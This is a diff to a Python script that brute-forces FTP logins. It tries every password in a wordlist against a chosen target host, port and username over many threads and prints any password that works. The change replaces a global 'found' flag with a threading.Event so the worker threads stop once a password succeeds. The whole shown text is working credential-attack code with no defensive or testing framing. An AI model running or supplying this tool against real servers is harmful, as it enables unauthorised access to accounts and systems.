@@ -1,5 +1,6 @@
 import ftplib
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
 import os
 
 os.system("clear")
@@ -47,18 +48,17 @@ except FileNotFoundError:
 
 print(f"\n🚀 Testing all passwords in the list on {target}:{port} as {username}...\n")
 
-found = False
+found_event = threading.Event()
 
 def try_password(pw):
-    global found
-    if found:
+    if found_event.is_set():
         return None
     try:
         ftp = ftplib.FTP()
         ftp.connect(target, port, timeout=5)
         ftp.login(user=username, passwd=pw)
         ftp.quit()
-        found = True
+        found_event.set()
         return pw
     except ftplib.error_perm:
         return None
@@ -73,6 +73,7 @@ with ThreadPoolExecutor(max_workers=max_workers) as executor:
         result = future.result()
         if result:
             print(f"\n✅ Success! Username: {username} | Password: {result}")
+            # executor.shutdown(wait=False) # opsiyonel, çünkü with bloğu sonrası kapanır
             break
     else:
         print("\n❌ Password not found in list.")
